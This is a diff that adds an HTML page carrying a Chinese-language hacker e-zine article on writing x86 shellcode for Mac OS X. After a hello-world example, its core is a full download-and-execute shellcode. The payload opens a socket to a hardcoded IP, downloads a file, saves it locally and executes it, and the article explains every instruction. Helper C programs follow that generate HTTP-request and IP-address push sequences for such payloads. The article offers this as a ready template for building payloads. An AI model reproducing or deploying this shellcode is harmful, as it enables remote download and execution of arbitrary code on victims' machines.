@@ -1,0 +1,593 @@
+﻿<html>
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>Shellcode For Mac OSX (x86) Tips</title>
+</head>
+<body>
+<pre style="width: 100%; word-wrap:break-word;">
+                           ==Ph4nt0m Security Team==
+ 
+                       Issue 0x01, Phile #0x05 of 0x06
+ 
+
+|=---------------------------------------------------------------------------=|
+|=------------------=[ Shellcode For Mac OSX (x86) Tips ]=-------------------=|
+|=---------------------------------------------------------------------------=|
+|=---------------------------------------------------------------------------=|
+|=--------------------=[           By noop             ]=--------------------=|
+|=------------------=[   &lt;wo0wo0noop_at_gmail_dot_com&gt;   ]=------------------=|
+|=---------------------------------------------------------------------------=|
+
+
+一、hello, world
+
+    Mac OSX 目前的版本是10.5.1,其内核是基于bsd的，文件格式是自有的macho格式。市
+面上新的机器都是x86构架。
+    
+    Mac系统对系统调用的处理与freebsd是一致的，都是通过堆栈传递函数参数。
+    
+    这里举个最简单的例子来说明问题：
+
+--------------------华丽的分割开始-----------------
+global  start
+start:
+xor             eax,eax
+
+jmp short       string
+
+code:
+pop             esi
+push byte       15
+push            esi
+push byte       1
+push            eax
+mov             al,4
+int             0x80
+
+push            eax
+mov             al,1
+int             0x80
+
+string:
+call code
+db      &#34;Hello!, world!&#34;,0x0a
+-----------------华丽的分割结束---------------
+
+    这是一个蛮简单的hello world,和*nix一样可以使用jmp call方法，这里做些简单的描
+述，照顾一下各种读者。
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+global start
+; 默认是使用start的，而不是_start。
+xor    eax，eax
+; 对eax清零，
+jmp short    string
+; 跳转到string，
+string：
+call code
+db    &#34;Hello!, world!&#34;,0x0a
+; 这里call会把下一行压入栈，接下来会用到，注意结尾的0xa。
+code：
+pop    esi  //指向 hello!,word!
+push byte    15  //参数入栈,长度
+push    esi        //buf指针
+push byte    1   //fd
+push     eax        //这里是和linux稍有区别的地方，注意要多压一个寄存器入栈
+mov    al，4        //write的系统调用号
+int    0x80        
+
+push            eax
+mov             al,1
+int             0x80
+
+    同样道理，调用exit退出。
+
+    这里有个技巧：我们可以利用之前入栈但是没出栈的那个eax作为一个参数，所以在上一
+个系统调用的时候，可以考虑为下一个系统调用准备参数。
+
+    nasm编译的时候注意指定-f macho。
+
+
+二、 http-download &amp; execute
+
+    一般fbsd的shellcode到处都有的，根据Mac OSX的系统调用的变动稍作修改就可以用了。
+
+    这里我在linux shellcode的基础上改写了一个http下载执行的shellcode，这是通过底
+层函数实现的，而非Mac提供的封装后的调用，相对而言比较少见。
+
+------------------------华丽的分割线开始------------------
+global start
+start:
+xor             ecx,ecx
+xor             eax,eax
+cdq
+push            eax
+push byte       0x01
+push byte       0x02
+push            eax
+mov             al,97
+int             0x80
+xchg            edi,eax
+
+push            0x8380217d
+mov             ebp, 0xaffffffd
+not             ebp
+push            ebp
+mov             eax, esp
+push byte       0x10
+push            eax
+push            edi
+xor             eax,eax
+mov             al,98
+push            eax
+int             0x80
+
+push byte       0x41
+mov             ebx, esp
+mov             ebp, 0xfffffdfd
+not             ebp
+push            ebp
+push            ebx
+mov             al,5
+push            eax
+int             0x80
+xchg            esi, ebx
+xchg            ebx, eax
+
+sendq:
+push            0x0a0d0a0d
+push            0x302e312f
+push            0x50545448
+push            0x20657865
+push            0x2e636c61
+push            0x632f2f2f
+push            0x20544547 
+mov             ecx, esp
+push byte       0x1c
+push            ecx
+push            edi
+mov             al,0x4
+
+_request:
+push byte       0x1
+int             0x80
+
+_wait:
+dec             ecx
+push            ecx
+push            edi
+xor             eax,eax
+mov             al,0x3
+push byte       0x1
+int             0x80
+mov             eax,[ecx]
+cmp             eax,0xd0a0d0a
+jne             _wait
+xor             eax, eax
+
+_read:
+push            ecx
+push            edi
+mov             al,3
+
+_write:
+push byte       0x1
+int             0x80
+test            eax,eax
+je              close_file
+push            ecx
+push            ebx
+mov             al,4
+push byte       0x1
+int             0x80
+jmp             _read
+
+close_file:
+push            ebx
+xor             eax,eax
+push            eax
+mov             al,6
+int             0x80
+
+execv:
+mov             ebx,esi
+push            eax
+push            ebx
+mov             al,59
+push            eax
+int             0x80
+---------------------华丽的分割线结束----------------
+
+    这里我们是构造一个http的请求，然后下载到本地存为A，然后执行。
+
+    详细的分部分解释：
+
+---------------------连胜的分割线开始----------------
+global start
+start:
+xor             ecx,ecx
+xor             eax,eax
+cdq
+; 清零寄存器
+push            eax
+push byte       0x01
+push byte       0x02
+push            eax
+mov             al,97
+int             0x80
+; 系统调用socket
+int socket(int domain, int type, int protocol);
+; 参数反顺序入栈，另外额外push了一个eax。
+xchg            edi,eax
+; 将返回的句柄存入edi，保存备用。
+; 以下是connect系统调用：
+push            0x8380217d
+; 下载的服务器IP地址，可以通过工具生成，如果有0就要合理取反了。
+mov             ebp, 0xaffffffd
+not             ebp
+; 通过取反，避免产生0
+push            ebp
+mov             eax, esp
+; 构建一个sockaddr结构指针
+push byte       0x10
+push            eax
+push            edi
+; 参数依次入栈
+xor             eax,eax
+mov             al,98
+push            eax
+int             0x80
+; 通过connect系统调用建立连接。
+push byte       0x41
+mov             ebx, esp
+mov             ebp, 0xfffffdfd
+not             ebp
+push            ebp
+push            ebx
+mov             al,5
+push            eax
+int             0x80
+xchg            esi, ebx
+xchg            ebx, eax
+; 通过open系统调用打开一个文件句柄，文件名为A，如果不存在，会自动创建。这里需要注
+; 意的是要将open(const char *path, int oflag, ...)中第一个参数保留下来。所以在
+; 系统调用之后，有这么两句：
+xchg        esi, ebx
+xchg        ebx, eax
+; 将*path,也就是ebx保存到esi中，另外将返回的句柄保存到ebx中。
+sendq:
+push            0x0a0d0a0d
+push            0x302e312f
+push            0x50545448
+push            0x20657865
+push            0x2e636c61
+push            0x632f2f2f
+push            0x20544547 
+mov             ecx, esp
+push byte       0x1c
+; 这一段构建http请求，以及计算请求的长度（0x1c），都可以通过一个小工具生成，并且会自
+; 动对齐。
+push            ecx
+push            edi
+; 之前保存的句柄edi
+mov             al,0x4
+_request:
+push byte       0x1
+int             0x80
+; 通过write系统调用发送请求
+_wait:
+dec             ecx
+push            ecx
+push            edi
+xor             eax,eax
+mov             al,0x3
+push byte       0x1
+int             0x80
+; 通过调用write读取服务器返回的信息
+mov             eax,[ecx]
+cmp             eax,0xd0a0d0a
+; 判断是否出现0d0a0d0a来判断是否开始到数据段，是的话往下执行。
+jne             _wait
+; 否则的话跳回_wait标签继续读取
+xor             eax, eax
+; 清零eax，为下面的小循环做准备
+_read:
+push            ecx
+push            edi
+mov             al,3
+
+_write:
+push byte       0x1
+int             0x80
+test            eax,eax
+je              close_file
+push            ecx
+push            ebx
+mov             al,4
+push byte       0x1
+int             0x80
+jmp             _read
+; 这里通过巧妙地构建一个je，来判断每次读取以后是否到达文件尾部，是的话就关闭文件，否则则继续写入。
+close_file:
+push            ebx
+xor             eax,eax
+push            eax
+mov             al,6
+int             0x80
+; 通过调用close来关闭文件，ebx是之前保存的句柄。
+execv:
+mov             ebx,esi
+push            eax
+push            ebx
+mov             al,59
+push            eax
+int             0x80
+; 通过execv系统调用来执行下载的文件。
+---------------------连胜的分割线结束----------------
+
+    在写这样子很长，很多系统调用的shellcode的时候，有几点值得注意：
+
+    1.尽量利用上一个系统调用最后push的那个不会出栈的“无用”内容作为下一个系统调用的参数;
+    2.如果出现0,可以通过取反来规避;
+    3.注意保存系统调用的返回值到合适的寄存器;
+    4.注意文件生成的权限。
+
+    这个shellcode只是一个范例，大家想写很复杂的shellcode的时候，不妨从这种类型开始。
+
+
+三、几个相关工具
+
+1.生成http请求的工具，来自tty64.
+/*
+ * gen_httpreq.c, utility for generating HTTP/1.x requests for shellcodes
+ *
+ * SIZES: 
+ *
+ *      HTTP/1.0 header request size - 18 bytes+
+ *      HTTP/1.1 header request size - 26 bytes+
+ *
+ * NOTE: The length of the selected HTTP header is stored at EDX register. 
+ *       Thus the generated MOV instruction (to EDX/DX/DL) is size-based. 
+ *
+ * - izik@tty64.org
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;string.h&gt;
+
+#define X86_PUSH \
+        0x68
+
+#define X86_MOV_TO_DL(x) \
+        printf(&quot;\t\&quot;\\xb2\\x%02x\&quot;\n&quot;, x &amp; 0xFF);
+
+#define X86_MOV_TO_DX(x) \
+        printf(&quot;\t\&quot;\\x66\\xba\\x%02x\\x%02x\&quot;\n&quot;, \
+        (x &amp; 0xFF), ((x &gt;&gt; 8) &amp; 0xFF));
+
+#define X86_MOV_TO_EDX(x) \
+        printf(&quot;\t\&quot;\\xba\\x%02x\\x%02x\\x%02x\\x%02x\&quot;\n&quot;, \
+        (x &amp; 0xFF), ((x &gt;&gt; 8) &amp; 0xFF), ((x &gt;&gt; 16) &amp; 0xFF), ((x &gt;&gt; 24) &amp; 0xFF));
+
+void usage(char *);
+int printx(char *fmt, ...);
+
+int main(int argc, char **argv) {
+
+        if (argc &lt; 2) {
+                usage(argv[0]);
+                return -1;
+        }
+
+        if (argv[2][0] != &#34;/&#34;) {
+
+                fprintf(stderr, &quot;filename must begin with &#34;/&#34; as any sane URL! (e.g. /index.html)\n&quot;);
+
+                return -1;
+        }
+
+        if (!strcmp(argv[1], &quot;-0&quot;)) {
+
+                return printx(&quot;GET %s HTTP/1.0\r\n\r\n&quot;, argv[2]);
+        }
+
+        if (!strcmp(argv[1], &quot;-1&quot;)) {
+
+                if (argc != 4) {
+
+                        fprintf(stderr, &quot;missing &lt;host&gt;, required parameter for HTTP/1.1 header! (e.g. www.tty64.org)\n&quot;);
+
+                        return -1;
+                }
+
+                return printx(&quot;GET %s HTTP/1.1\r\nHost: %s\r\n\r\n&quot;, argv[2], argv[3]);
+        }
+
+        fprintf(stderr, &quot;%s: unknown http protocol, try -0 or -1\n&quot;, argv[1]);
+
+        return -1;
+}
+
+/*
+ * usage, display usage screen
+ * * basename, barrowed argv[0]
+ */
+
+void usage(char *basename) {
+
+        printf(
+                &quot;usage: %s &lt;-0|-1&gt; &lt;filename&gt; [&lt;host&gt;]\n\n&quot;
+                &quot;\t -0, HTTP/1.0 GET request\n&quot;
+                &quot;\t -1, HTTP/1.1 GET request\n&quot;
+                &quot;\t &lt;filename&gt;, given filename (e.g. /shellcode.bin)\n&quot;
+                &quot;\t &lt;host&gt;, given hostname (e.g. www.tty64.org) [required for HTTP 1.1]\n\n&quot;,
+                basename);
+
+        return ;
+}
+
+/*
+ * printx, fmt string. generate the shellcode chunk
+ * * fmt, given format string
+ */
+
+int printx(char *fmt, ...) {
+        va_list ap;
+        char buf[256], pad_buf[4], *w_buf;
+        int pad_length, buf_length, i, tot_length;
+
+        memset(buf, 0x0, sizeof(buf));
+
+        va_start(ap, fmt);
+        vsnprintf(buf, sizeof(buf), fmt, ap);
+        va_end(ap);
+
+        buf_length = strlen(buf);
+
+        printf(&quot;\nURL: %s\n&quot;, buf);
+        printf(&quot;Header Length: %d bytes\n&quot;, buf_length);
+
+        for (i = 1; buf_length &gt; (i * 4); i++) {
+                pad_length = ((i+1)*4) - buf_length;
+        }
+
+        printf(&quot;Padding Length: %d bytes\n\n&quot;, pad_length);
+
+        tot_length = buf_length + pad_length;
+
+        w_buf = buf;
+
+        if (pad_length) {
+
+                w_buf = calloc(tot_length, sizeof(char));
+
+                if (!w_buf) {
+
+                        perror(&quot;calloc&quot;);
+                        return -1;
+                }
+
+                i = index(buf, &#34;/&#34;) - buf;
+
+                memset(pad_buf, 0x2f, sizeof(pad_buf));
+
+                memcpy(w_buf, buf, i);
+                memcpy(w_buf+i, pad_buf, pad_length);
+                memcpy(w_buf+pad_length+i, buf+i, buf_length - i);
+        }
+
+        for (i = tot_length - 1; i &gt; -1; i-=4) {
+
+                printf(&quot;\t\&quot;\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\&quot; // pushl $0x%02x%02x%02x%02x\n&quot;,
+                        X86_PUSH, w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i], w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i]);
+        }
+
+        if (pad_length) {
+
+                free(w_buf);
+        }
+
+        //
+        // The EDX register is assumed to be zero-out within the shellcode.
+        //
+
+        if (tot_length &lt; 256) {
+
+                // 8bit value
+
+                X86_MOV_TO_DL(tot_length);
+
+        } else if (tot_length &lt; 655356) {
+
+                // 16bit value
+
+                X86_MOV_TO_DX(tot_length);
+
+        } else {
+
+                // 32bit value, rarely but possible ;-)
+
+                X86_MOV_TO_EDX(tot_length);
+
+        }
+
+        fputc(&#34;\n&#34;, stdout);
+
+        return 1;
+}
+}
+
+2. 生成十六进制ip地址的工具。
+/*
+* one minite coding by noop
+*/
+#include&lt;netinet/in.h&gt;
+#include&lt;arpa/inet.h&gt;
+#include&lt;stdio.h&gt;
+
+int main(int argc,char **argv)
+{
+    struct in_addr ip;
+    unsigned int addr;
+
+    if(argc != 2)
+    {
+        fprintf(stderr,&quot;Usage 128.0.0.9\n&quot;);
+        return 1;
+    }
+
+    inet_aton(argv[1],&amp;ip);
+
+    printf(&quot;0x%x\n&quot;,ntohl(ip.s_addr) );
+
+    return 0;
+}
+
+
+四、总结
+
+    这些东西也不属于我完全原创，很多东西都是从前辈那学习二来，总结了些一些经验，提
+供了一些范例，希望对研究Mac系统的朋友有所帮助。
+
+    另外还有一个小技巧，比较懒的人，可以考虑写一个小程序来读取macho文件中的代码部
+分，自动转换成shellcode，比较省力。相关资料请参考Mac的文件格式文档，我就不提供代码
+了，写这么个东西也不困难。
+
+    有什么问题，欢迎在幻影的邮件列表提出，我平时不怎么收邮箱的邮件，所以，单独发邮
+件的可能看不到。
+
+
+五、参考文档：
+
+[1] b-r00t&#34;s Smashing the Mac for Fun &amp; Profit
+    http://www.milw0rm.com/papers/44  
+[2] Mac OS X PPC Shellcode Tricks -
+    http://www.uninformed.org/?v=1&amp;a=1&amp;t=pdf
+[3] Mac OS X wars - a XNU Hope
+    http://www.phrack.org/issues.html?issue=64&amp;id=11#article
+[4] Mach-O Runtime 
+    http://developer.apple.com/documentation/DeveloperTools/ ...
+    Conceptual/MachORuntime/MachORuntime.pdf
+[5] Ilja&#34;s blackhat talk - 
+    http://www.blackhat.com/presentations/bh-europe-05/ ...
+    BH_EU_05-Klein_Sprundel.pdf
+[6] Radical Environmentalists by Netric -
+    http://packetstormsecurity.org/groups/netric/envpaper.pdf
+[7] Non eXecutable Stack Lovin on OSX86 -
+    http://www.digitalmunition.com/NonExecutableLovin.txt
+[8] Mach-O Infection -
+    http://felinemenace.org/~nemo/slides/mach-o_infection.ppt
+[9] Infecting Mach-O Fies
+    http://vx.netlux.org/lib/vrg01.html
+[10] class-dump
+    http://www.codethecode.com/Projects/class-dump/
+[11] Architecture Spanning Shellcode -
+    http://www.phrack.org/archives/57/p57-0x17
+
+
+-EOF-
+</pre>
+</body>
+</html>
